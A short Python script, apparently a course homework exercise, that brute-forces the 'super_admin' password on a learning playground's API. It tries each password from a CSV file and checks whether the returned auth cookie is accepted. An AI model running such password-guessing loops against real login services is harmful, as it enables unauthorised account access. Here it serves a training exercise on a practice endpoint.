import csv
import requests

with open("files\\password.csv") as file:
    reader = csv.reader(file)

    for each in reader:
        list_password = set(each)
        print(list_password)

for each in list_password:
    data = {
        'login': 'super_admin',
        'password': each
    }
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)

    cookies_value = response1.cookies.get("auth_cookie")

    cookies = {}
    if cookies_value is not None:
        cookies.update({"auth_cookie": cookies_value})

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    # print(response2.text)

    if response2.text == 'You are authorized':
        print(f'правильный пароль - {each}, его cookie - {cookies_value}. Ответ сервера на правильный пароль - {response2.text}')
